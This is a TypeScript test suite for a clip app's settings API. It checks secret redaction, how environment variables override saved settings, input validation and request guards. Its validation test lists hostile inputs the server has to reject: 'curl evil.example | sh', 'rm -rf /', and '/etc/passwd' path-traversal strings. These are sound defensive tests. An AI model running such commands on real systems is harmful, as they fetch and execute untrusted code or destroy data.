import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, readFile, rm, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

import type { PublicSettings } from "../src/core/settings";

/**
 * These tests drive a real server process: the settings file location, the environment precedence and the request
 * guards are all decided at startup, and other test files share this process's module cache.
 */

const SERVER = resolve(import.meta.dir, "../src/server/index.ts");
const SECRET = "sk-test-secret-1234567890";
const ENV_KEYS = [
  "LLM_COMMAND",
  "LLM_PROVIDER",
  "LLM_BASE_URL",
  "LLM_API_KEY",
  "LLM_MODEL",
  "WHISPER_MODEL",
  "GCLIP_RENDER_JOBS",
];

interface Running {
  base: string;
  stop: () => Promise<void>;
}

let root: string;
let workspace: string;
let models: string;
const running: Running[] = [];

/** Empty strings (not unset) so a developer's .env cannot leak into the child: Bun's .env never overrides defined variables. */
async function start(env: Record<string, string> = {}): Promise<Running> {
  const proc = Bun.spawn(["bun", SERVER], {
    cwd: resolve(import.meta.dir, ".."),
    env: {
      ...Bun.env,
      ...Object.fromEntries(ENV_KEYS.map((key) => [key, ""])),
      GCLIP_WORKSPACE: workspace,
      GCLIP_MODELS: models,
      PORT: "0",
      HOST: "127.0.0.1",
      ...env,
    },
    stdout: "pipe",
    stderr: "ignore",
  });
  // PORT=0 lets the OS pick a free port (a fixed one can collide with another process). The server prints the
  // address once it listens; the rest of its output is drained so the pipe never fills up.
  const decoder = new TextDecoder();
  const reader = proc.stdout.getReader();
  let output = "";
  while (!/gaming-clip UI: \S+:\d+/.test(output)) {
    const { done, value } = await reader.read();
    if (done) throw new Error("server exited before it started listening");
    output += decoder.decode(value);
  }
  const base = `http://127.0.0.1:${/gaming-clip UI: \S+:(\d+)/.exec(output)![1]}`;
  void (async () => {
    while (!(await reader.read()).done);
  })();
  const server: Running = {
    base,
    stop: async () => {
      proc.kill();
      await proc.exited;
    },
  };
  running.push(server);
  return server;
}

type SettingsBody = PublicSettings & { error?: string };

async function patch(server: Running, body: unknown): Promise<{ status: number; json: SettingsBody }> {
  const res = await fetch(`${server.base}/api/settings`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return { status: res.status, json: (await res.json()) as SettingsBody };
}

async function get(server: Running): Promise<SettingsBody> {
  return (await fetch(`${server.base}/api/settings`)).json() as Promise<SettingsBody>;
}

beforeAll(async () => {
  root = await mkdtemp(join(tmpdir(), "gclip-settings-"));
  workspace = join(root, "ws");
  models = join(root, "models");
  await mkdir(models, { recursive: true });
  // An installed model, so selecting it is allowed without downloading anything.
  await writeFile(join(models, "ggml-tiny.bin"), "fake model");
});

afterAll(async () => {
  await Promise.all(running.map((server) => server.stop()));
  await rm(root, { recursive: true, force: true });
});

describe("settings", () => {
  test("defaults, saving, persistence, key never returned, file mode 0600", async () => {
    const first = await start();
    const defaults = await get(first);
    expect(defaults.values).toMatchObject({
      aiMode: "off",
      llmCommandPreset: null,
      whisperModel: "large-v3-turbo-q5_0",
      defaultLanguage: "auto",
      renderJobs: 2,
    });
    expect(Object.values(defaults.sources).every((source) => source === "default")).toBe(true);
    expect(defaults.llmApiKeySet).toBe(false);
    expect(defaults.values).not.toHaveProperty("llmApiKey");

    const saved = await patch(first, {
      aiMode: "openai",
      llmModel: "gpt-test",
      llmBaseUrl: "http://localhost:11434/v1/",
      llmApiKey: SECRET,
      whisperModel: "tiny",
      defaultLanguage: "id",
      renderJobs: 3,
    });
    expect(saved.status).toBe(200);
    expect(saved.json.values).toMatchObject({
      aiMode: "openai",
      llmModel: "gpt-test",
      llmBaseUrl: "http://localhost:11434/v1",
      whisperModel: "tiny",
      defaultLanguage: "id",
      renderJobs: 3,
    });
    expect(saved.json.sources.aiMode).toBe("settings");
    expect(saved.json.llmApiKeySet).toBe(true);
    expect(JSON.stringify(saved.json)).not.toContain(SECRET);
    expect(JSON.stringify(await get(first))).not.toContain(SECRET);

    const file = join(workspace, "settings.json");
    expect(JSON.parse(await readFile(file, "utf8")).llmApiKey).toBe(SECRET);
    if (process.platform !== "win32") expect((await stat(file)).mode & 0o777).toBe(0o600);

    // A new process reads the same file.
    await first.stop();
    const second = await start();
    const again = await get(second);
    expect(again.values).toMatchObject({ aiMode: "openai", llmModel: "gpt-test", whisperModel: "tiny", renderJobs: 3 });
    expect(again.llmApiKeySet).toBe(true);

    // "" clears a saved key; the file is rewritten with mode 0600 again.
    const cleared = await patch(second, { llmApiKey: "" });
    expect(cleared.json.llmApiKeySet).toBe(false);
    expect(JSON.parse(await readFile(file, "utf8"))).not.toHaveProperty("llmApiKey");
    if (process.platform !== "win32") expect((await stat(file)).mode & 0o777).toBe(0o600);
    await second.stop();
  }, 90_000);

  test("environment beats settings.json beats the default; env-locked fields answer 409", async () => {
    // The previous test left a settings.json with llmModel "gpt-test", aiMode "openai", whisperModel "tiny", renderJobs 3.
    const server = await start({
      LLM_MODEL: "env-model",
      LLM_PROVIDER: "anthropic",
      GCLIP_RENDER_JOBS: "1",
      WHISPER_MODEL: "tiny",
    });
    const settings = await get(server);
    expect(settings.values).toMatchObject({
      aiMode: "anthropic",
      llmModel: "env-model",
      renderJobs: 1,
      whisperModel: "tiny",
    });
    expect(settings.sources).toMatchObject({
      aiMode: "env",
      llmModel: "env",
      renderJobs: "env",
      whisperModel: "env",
      llmBaseUrl: "settings",
      defaultLanguage: "settings",
    });
    expect(settings.envVars).toMatchObject({
      aiMode: "LLM_MODEL",
      llmModel: "LLM_MODEL",
      renderJobs: "GCLIP_RENDER_JOBS",
      whisperModel: "WHISPER_MODEL",
    });

    const model = await patch(server, { llmModel: "other" });
    expect(model.status).toBe(409);
    expect(model.json.error).toContain("LLM_MODEL");
    expect((await patch(server, { renderJobs: 4 })).json.error).toContain("GCLIP_RENDER_JOBS");
    // Nothing is written by a refused change, even for the fields that were allowed.
    const mixed = await patch(server, { defaultLanguage: "ja", llmModel: "other" });
    expect(mixed.status).toBe(409);
    expect((await get(server)).values.defaultLanguage).toBe("id");
    // Fields without an environment variable stay editable.
    expect((await patch(server, { defaultLanguage: "ja" })).status).toBe(200);
    await server.stop();

    const command = await start({ LLM_COMMAND: "my-own-agent --flag" });
    const withCommand = await get(command);
    expect(withCommand.values.aiMode).toBe("command");
    expect(withCommand.sources.aiMode).toBe("env");
    expect(withCommand.sources.llmCommandPreset).toBe("env");
    // The custom command itself is not echoed back.
    expect(JSON.stringify(withCommand)).not.toContain("my-own-agent");
    const preset = await patch(command, { llmCommandPreset: "claude" });
    expect(preset.status).toBe(409);
    expect(preset.json.error).toContain("LLM_COMMAND");
    expect((await patch(command, { aiMode: "off" })).status).toBe(409);
    await command.stop();
  }, 90_000);

  test("strict validation", async () => {
    await rm(join(workspace, "settings.json"), { force: true });
    const server = await start();
    const bad: [string, unknown][] = [
      ["unknown key", { nope: 1 }],
      ["arbitrary command", { llmCommand: "curl evil.example | sh" }],
      ["command next to a valid field", { aiMode: "off", llmCommand: "touch /tmp/x" }],
      ["unknown preset", { llmCommandPreset: "rm -rf /" }],
      ["preset not a string", { llmCommandPreset: 3 }],
      ["unknown mode", { aiMode: "gemini" }],
      ["command mode without an app", { aiMode: "command" }],
      ["api mode without a model", { aiMode: "openai" }],
      ["base url with credentials", { llmBaseUrl: "https://user:pass@example.com/v1" }],
      ["base url not http", { llmBaseUrl: "file:///etc/passwd" }],
      ["base url not a url", { llmBaseUrl: "example" }],
      ["model not a string", { llmModel: 5 }],
      ["key with newline", { llmApiKey: "a\nb" }],
      ["unknown whisper model", { whisperModel: "huge" }],
      ["whisper model not downloaded", { whisperModel: "base" }],
      ["whisper model path", { whisperModel: "../../etc/passwd" }],
      ["language name", { defaultLanguage: "English" }],
      ["jobs too low", { renderJobs: 0 }],
      ["jobs too high", { renderJobs: 5 }],
      ["jobs fraction", { renderJobs: 1.5 }],
      ["jobs string", { renderJobs: "2" }],
    ];
    for (const [name, body] of bad) {
      const res = await patch(server, body);
      expect([name, res.status]).toEqual([name, 400]);
      expect(typeof res.json.error).toBe("string");
    }
    for (const body of ["[]", "null", '"x"', "{not json"]) {
      const res = await fetch(`${server.base}/api/settings`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body,
      });
      expect([body, res.status]).toEqual([body, 400]);
    }
    // Refused changes wrote nothing.
    expect(await Bun.file(join(workspace, "settings.json")).exists()).toBe(false);
    const preset = await patch(server, { aiMode: "command", llmCommandPreset: "claude" });
    expect(preset.status).toBe(200);
    expect(preset.json.values).toMatchObject({ aiMode: "command", llmCommandPreset: "claude" });
    expect(preset.json.aiCommandPresets.map((entry: { id: string }) => entry.id)).toEqual(["claude", "codex"]);
    await server.stop();
  }, 90_000);

  test("settings routes use the same request guards as every other route", async () => {
    const server = await start();
    const routes: [string, string][] = [
      ["GET", "/api/settings"],
      ["PATCH", "/api/settings"],
      ["POST", "/api/settings/test-ai"],
      ["GET", "/api/settings/whisper-models"],
      ["POST", "/api/settings/whisper-models/tiny/download"],
    ];
    for (const [method, path] of routes) {
      const hostile = await fetch(`${server.base}${path}`, {
        method,
        headers: { Host: "evil.example", "Content-Type": "application/json" },
        body: method === "GET" ? undefined : "{}",
      });
      expect([method, path, hostile.status]).toEqual([method, path, 403]);
      const foreign = await fetch(`${server.base}${path}`, {
        method,
        headers: { Origin: "http://evil.example", "Content-Type": "application/json" },
        body: method === "GET" ? undefined : "{}",
      });
      expect([method, path, foreign.status]).toEqual([method, path, 403]);
      if (method !== "GET") {
        const plain = await fetch(`${server.base}${path}`, {
          method,
          headers: { "Content-Type": "text/plain" },
          body: "{}",
        });
        expect([method, path, plain.status]).toEqual([method, path, 415]);
      }
    }
    await server.stop();
  }, 60_000);

  test("whisper model list, download refusals and test-ai against a mock service", async () => {
    await rm(join(workspace, "settings.json"), { force: true });
    const seen: { auth: string | null; body: unknown }[] = [];
    let fail = false;
    const mock = Bun.serve({
      port: 0,
      async fetch(req) {
        seen.push({ auth: req.headers.get("authorization"), body: await req.json() });
        if (fail) return new Response(`bad key ${SECRET}`, { status: 401 });
        return Response.json({
          id: "x",
          object: "chat.completion",
          created: 0,
          model: "mock",
          choices: [{ index: 0, message: { role: "assistant", content: '{"ok":true}' }, finish_reason: "stop" }],
          usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
        });
      },
    });
    try {
      const server = await start();
      const list = (await (await fetch(`${server.base}/api/settings/whisper-models`)).json()) as {
        name: string;
        installed: boolean;
        size: number;
        downloading: unknown;
      }[];
      expect(list.find((model) => model.name === "tiny")).toMatchObject({ installed: true, downloading: null });
      expect(list.find((model) => model.name === "base")).toMatchObject({ installed: false, downloading: null });
      expect(list.every((model) => model.size > 0)).toBe(true);

      const download = (name: string) =>
        fetch(`${server.base}/api/settings/whisper-models/${name}/download`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: "{}",
        });
      expect((await download("tiny")).status).toBe(409);
      expect((await download("nope")).status).toBe(400);

      const off = await fetch(`${server.base}/api/settings/test-ai`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: "{}",
      });
      expect(await off.json()).toMatchObject({ ok: false });

      await patch(server, {
        aiMode: "openai",
        llmModel: "mock-model",
        llmBaseUrl: `http://127.0.0.1:${mock.port}/v1`,
        llmApiKey: SECRET,
      });
      const testAi = async () =>
        (await (
          await fetch(`${server.base}/api/settings/test-ai`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: "{}",
          })
        ).json()) as { ok: boolean; ms: number; error?: string };
      const good = await testAi();
      expect(good.ok).toBe(true);
      expect(good.ms).toBeGreaterThanOrEqual(0);
      expect(seen.at(-1)?.auth).toBe(`Bearer ${SECRET}`);

      fail = true;
      const refused = await testAi();
      expect(refused.ok).toBe(false);
      expect(refused.error).toBeTruthy();
      expect(JSON.stringify(refused)).not.toContain(SECRET);
      await server.stop();
    } finally {
      await mock.stop(true);
    }
  }, 90_000);

  test("the default language pre-fills new projects", async () => {
    await rm(join(workspace, "settings.json"), { force: true });
    const server = await start();
    await patch(server, { defaultLanguage: "ja" });
    const created = await fetch(`${server.base}/api/projects`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ inputs: ["/nonexistent/clip.mp4"] }),
    });
    expect(created.status).toBe(201);
    const [project] = (await created.json()) as { id: string; options: { language: string } }[];
    expect(project?.options.language).toBe("ja");
    await fetch(`${server.base}/api/projects/${project?.id}`, { method: "DELETE" });
    await server.stop();
  }, 60_000);
});
